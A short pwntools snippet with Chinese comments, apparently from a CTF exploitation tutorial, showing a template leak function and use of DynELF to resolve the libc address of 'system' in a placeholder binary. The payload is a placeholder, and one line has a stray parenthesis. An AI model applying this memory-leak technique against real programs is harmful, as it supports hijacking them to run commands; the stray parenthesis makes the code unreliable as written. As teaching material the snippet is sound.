p = process('./xxx')
def leak(address):
  #各种预处理
  payload = "xxxxxxxx" + address + "xxxxxxxx"
  p.send(payload)
  #各种处理
  data = p.recv(4) )#接受的字节要看程序是32位还是64位来决定 ，32位接受4个字节的数据 而64位接受8个字节的数据
  log.debug("%#x => %s" % (address, (data or '').encode('hex')))#这里是测试 可省略
  return data
d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址